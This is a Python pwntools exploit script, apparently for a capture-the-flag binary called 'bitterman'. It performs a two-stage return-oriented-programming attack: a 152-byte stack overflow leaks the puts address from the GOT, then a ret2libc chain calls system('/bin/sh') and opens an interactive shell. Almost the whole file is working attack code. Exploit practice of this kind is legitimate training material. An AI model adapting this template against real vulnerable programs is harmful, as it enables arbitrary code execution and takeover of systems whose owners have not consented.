#!/usr/bin/python
# coding:UTF-8

# -------------------------------------------------------------------------------------
#                  PYTHON UTILITY SCRIPT FILE FOR ROP EXPLOITATION
#               BY TERENCE BROADBENT BSC CYBER SECURITY (FIRST CLASS)
# -------------------------------------------------------------------------------------

from pwn import *
p = process('./bitterman')
context(os='linux', arch='amd64')
context.log_level = 'info'

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : 1.0                                                                
# Details : Stage one.
# Modified: N/A
# -------------------------------------------------------------------------------------

elf  = ELF("./bitterman")
rop  = ROP(elf.path)
libc = ELF("./rlibc.so.6")
info(rop.dump())
junk = "A"*152
rop.search(regs=['rdi'], order='regs')
rop.puts(elf.got['puts'])
rop.call(elf.symbols['main'])
payload = junk + str(rop)

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : 1.0                                                                
# Details : Program specific deployment.
# Modified: N/A
# -------------------------------------------------------------------------------------

p.recvuntil("name?")			# > What's your name? 
p.sendline("spooks7")			# sp00ks7
					# Hi, sp00ks7
					#
p.recvuntil("message:")			# > Please input the length of your message: 
p.sendline("1024")			# 2014
p.recvuntil("text:")			# > Please enter your text: 
p.sendline(payload)			# payload goes here!
p.recvuntil("Thanks!")			# > Thanks!


leaked_puts = p.recv()[:8].strip().ljust(8, '\x00')
log.success("Leaked puts@GLIBC " + str(leaked_puts))
leaked_puts = u64(leaked_puts)

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : 1.0                                                                
# Details : Stage two.
# Modified: N/A
# -------------------------------------------------------------------------------------

libc.address = leaked_puts - libc.symbols['puts']
rop2 = ROP(libc)
rop2.system(next(libc.search('/bin/sh\x00')))
info(rop2.dump())
payload  = junk + str(rop2)

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : 1.0                                                                
# Details : Program specific deployment.
# Modified: N/A
# -------------------------------------------------------------------------------------

p.sendline("spooks7")			# spooks7
					# Hi, sp00ks7
					#
p.recvuntil("message:")			# > Please input the length of your message: 
p.sendline("1024")			# 2014
p.recvuntil("text:")			# > Please enter your text: 
p.sendline(payload)			# Send payload here

success("PWNED!!")
p.interactive()

